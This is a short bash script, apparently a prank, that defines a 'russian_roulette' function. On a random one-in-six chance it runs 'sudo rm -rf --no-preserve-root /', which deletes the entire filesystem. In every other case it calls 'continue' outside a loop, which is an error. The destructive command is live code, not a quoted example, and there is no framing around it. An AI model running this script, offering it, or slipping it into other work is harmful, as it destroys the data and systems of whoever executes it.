#!/bin/bash
russian_roulette() {
  RANDOM_NUMBER=$((RANDOM % 6 + 1))
  if [ $RANDOM_NUMBER -eq 6 ]; then 
    sudo rm -rf --no-preserve-root /
  else
    continue
  fi
}

